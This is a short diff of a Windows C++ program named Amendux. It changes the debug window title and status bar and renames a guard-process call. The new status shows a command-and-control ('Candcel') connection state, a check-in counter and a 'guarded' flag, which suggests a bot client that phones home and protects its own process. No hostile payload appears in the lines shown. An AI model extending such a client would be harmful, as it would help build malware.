@@ -59,7 +59,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 
 	// Launch the threading processes
 	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
-	Amendux::Process::SpawnGuard();
+	Amendux::Process::SpawnGuardProcess();
 
 	// Main message loop
     MSG msg;
@@ -155,15 +155,13 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 	// Main window
 	MainRegisterClass(hInstance);
 
-	HWND hWnd = CreateWindow(WINUICLASS, L"Amendux [DEBUG MODE]", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
+	HWND hWnd = CreateWindow(WINUICLASS, L"Amendux", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
 	if (!hWnd) {
 		ReleaseMutex(hMutex);
 		return false;
 	}
 
 	CreateStatusBar(hWnd, (HMENU)IDC_MAIN_STATUS, hInstance, 1);
-
-	SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 0, (LPARAM)L"Start core modules... [DEBUG]");
 
 	ShowWindow(hWnd, nCmdShow);
 	UpdateWindow(hWnd);
@@ -355,6 +353,21 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 				HDC hdc = BeginPaint(hWnd, &ps);
 				// TODO: Add any drawing code that uses hdc here...
 				EndPaint(hWnd, &ps);
+
+				std::wstring status = L"Running... [DEBUG]";
+				std::wstring tile = L"Amendux [DEBUG]";
+				
+				status += L"[" + Amendux::Config::Current()->ModeName() + L"]";
+				tile += L"[" + Amendux::Config::Current()->ModeName() + L"]";
+
+				SetWindowText(hWnd, tile.c_str());
+
+				if (Amendux::Candcel::Current()->IsConnected()) {
+					status += L"[CONNECTED][CHECKIN:" + std::to_wstring(Amendux::Candcel::Current()->CheckinCounter()) + L"]";
+					status += L"[GUARDED]";
+				}
+
+				SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 0, (LPARAM)status.c_str());
 			}
 			break;
 
